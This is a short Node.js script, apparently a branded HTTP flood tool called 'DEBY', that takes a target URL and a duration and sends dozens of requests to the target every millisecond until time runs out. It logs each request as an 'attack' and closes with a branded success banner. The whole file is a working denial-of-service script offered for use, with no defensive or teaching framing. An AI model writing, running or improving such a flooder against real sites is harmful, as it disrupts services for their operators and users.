const target = process.argv[2];
const duration = process.argv[3];

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('[ ! ] Invalid Usage: node index.js URL DURATION.\nExample: https://example.com 120');
    process.exit(1)
} else {
    let deby = 0;
    const attackInterval = setInterval(() => {
        for (let i = 0; i < 40; i++) {
            console.log(`[ ! ] [𝐃𝐄𝐁𝐘] Successfully sent an attack to the target\nTotal attacks sent to the target: ${deby}`);
            fetch(target).catch(error => {});
            deby++;
        }
        
    }, 1);

    setTimeout(() => {
        console.clear();
        clearInterval(attackInterval);
        console.log(`                                                              
`);
        console.log(`[ ! ] 𝐒𝐮𝐜𝐜𝐞𝐬𝐟𝐮𝐥𝐥𝐲 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐃𝐄𝐁𝐘!\n`);
        console.log(`𝐓𝐚𝐫𝐠𝐞𝐭: ${target}`);
        console.log(`𝐓𝐢𝐦𝐞𝐬: ${duration}`);
        process.exit(0);
    }, duration * 1000);
}